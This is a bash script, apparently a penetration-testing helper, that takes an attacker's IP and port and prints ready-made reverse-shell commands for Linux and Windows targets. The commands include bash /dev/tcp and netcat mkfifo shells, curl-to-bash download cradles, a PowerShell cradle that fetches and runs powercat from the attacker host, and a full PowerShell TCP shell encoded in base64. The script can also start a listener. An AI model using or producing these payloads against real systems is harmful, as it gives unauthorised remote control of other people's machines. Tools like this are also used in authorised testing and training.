#!/bin/bash

# Check for correct number of arguments
if [ "$#" -lt 2 ]; then
    echo "Usage: $0 <lhost> <lport> [-l]"
    exit 1
fi

ip=$1
port=$2
listen_flag=0

# Check for '-l' argument
if [ "$#" -eq 3 ] && [ "$3" == "-l" ]; then
    listen_flag=1
fi

bash_shell="/bin/sh -i >& /dev/tcp/$ip/$port 0>&1"
invoke_ps="powershell -nop -noni -ep bypass" # Add "-w hidden" to hide the window (can break powercat in cmd)
powercat="IEX(New-Object System.Net.WebClient).DownloadString('http://$ip:8000/powercat.ps1');powercat -c $ip -p $port -e powershell"
ps_shell="\$client = New-Object System.Net.Sockets.TCPClient('$ip',$port);\$stream = \$client.GetStream();[byte[]]\$bytes = 0..65535|%{0};while((\$i = \$stream.Read(\$bytes, 0, \$bytes.Length)) -ne 0){;\$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString(\$bytes,0, \$i);\$sendback = (iex \$data 2>&1 | Out-String );\$sendback2 = \$sendback + 'PS ' + (pwd).Path + '> ';\$sendbyte = ([text.encoding]::ASCII).GetBytes(\$sendback2);\$stream.Write(\$sendbyte,0,\$sendbyte.Length);\$stream.Flush()};\$client.Close()"

# Cradles
echo -e "\n<== Web ==>\n"
echo -e "echo '/bin/sh -i >& /dev/tcp/192.168.45.221/9001 0>&1' > shell.sh\n"
echo -e "ON TARGET: curl <OUR_IP>/shell.sh | /bin/bash\n"
echo "ON TARGET: curl <OUR_IP>/shell.sh -o /tmp/shell.sh"
echo "ON TARGET: /bin/bash /tmp/shell.sh"

echo -e "\n<== Bash ==>\n"
echo -e "bash -c \"$bash_shell\"\n"
echo -e "echo '$(echo -n $bash_shell | base64 -w 0)' | base64 -d | bash\n"
echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc $ip $port >/tmp/f"

echo -e "\n<== Powercat (interactive) ==>\n"
echo -e "$invoke_ps -c \"$powercat\"\n"
echo "$invoke_ps -e $(echo -n $powercat | iconv -t utf-16le | base64 -w 0)"

echo -e "\n<== Base64 Encoded (non-interactive) ==>\n"
echo "$invoke_ps -e $(echo -n $ps_shell | iconv -t utf-16le | base64 -w 0)"

# Listener
if [ "$listen_flag" -eq 1 ]; then
    echo -e "\n  <===============================================================================================================>  \n"
    rlwrap -crA nc -lvnp $port
fi
